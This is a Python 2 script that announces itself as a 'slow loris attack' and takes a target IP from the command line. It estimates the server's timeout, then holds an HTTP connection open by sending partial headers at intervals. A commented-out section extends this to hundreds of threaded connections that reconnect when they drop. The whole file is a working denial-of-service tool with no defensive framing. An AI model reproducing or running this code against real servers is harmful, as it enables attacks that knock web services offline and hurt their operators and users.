#!/usr/bin/python

import thread
import sys
import socket
import time
import errno
from random import randint
vic = sys.argv
CRLF = "\r\n\r\n"
# Cheching args
if (len(vic) <= 1):
    print "./slow.py <vic ip>"
    sys.exit(0)
print "This is a slow loris attack to %s" % (vic[1])
# Openning connection to check timeout
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try :
    c.connect((vic[1], 80))
except socket.error as e :
    if e.errno == errno.ECONNREFUSED :
        print "Server wont let us connect"
        sys.exit(0)

print "Calculating timeout time"
t0 = time.time()
req = "GET http://localhost/index.html HTTP/2.0\r\n"
c.send(req)
data = c.recv(2048)
tf = "<h1>"
ind = data.find(tf)
print "Servers responded:"
if (ind != -1) :
    for i in range(ind+4,len(data)) :
        if (data[i] != '<') :
            sys.stdout.write(data[i])
            sys.stdout.flush()
        else :
            sys.stdout.write("\n")
            break
else :
    print "Couldnt recognise servers respons"

to = int(round(time.time() - t0))
print "Timeout = %d sec" % (to)
c.close()
#run = range(50)


run = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
run.connect((vic[1], 80))
run.send(req)
run.send("Connection: keep-alive\r\n")
counter = 1
print "Created socket"
while True :
    try :
        sm = "X-a: %d\r\n" %(randint(1,500))
        run.send(sm)
        print "Data #%d" %(counter)
        sys.stdout.write(sm)
        sys.stdout.flush()
        time.sleep(to/4)
        counter += 1
    except socket.error as e :
        if e.errno == errno.EPIPE:
            print "Broken Pipe"
        else :
            print "Some Error"
        sys.exit(0)

'''
for i in range(1,50) :
    try :
        run[i] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        run[i].connect((vic[1], 80))
        run[i].send(req)
        print "Created socket #%d" %(i)
    except socket.error as e :
        if e.errno == errno.ECONNREFUSED :
            print "Server wont let us connect\nConnection number %d" %(i)
            sys.exit(0)
        else :
            raise e
counter = 1
wt = to/2
while True :
    print counter
    for i in range(1,50) :
        try :
            run[i].send("X-a: %d\r\n" %(randint(1,500)))
        except socket.error as e :
            if e.errno == errno.EPIPE:
                run[i] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                run[i].connect((vic[1], 80))
                run[i].send(req)
                print "Created socket #%d" %(i)
            else :
                raise e
    print "Sleeping"
    time.sleep(wt)
    counter += 1


def slow(num) :
    try :
        con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        con.connect((vic[1], 80))
        con.send(req)
        run[num] = True
        while True :
            try :
                time.sleep(to/2)
                con.send("X-a: %d\r\n" %(randint(1,500)))
            except socket.error :
                run[num] = False
                sys.exit(0)
    except socket.error :
        run[num] = False
        sys.exit(0)
for i in range (1,500) :
    thread.start_new_thread(slow,(i,))
while True :
    time.sleep(10)
    for i in range (1,500) :
        if (run[i] == False) :
            print "New %d" %i
            thread.start_new_thread(slow,(i,))
'''
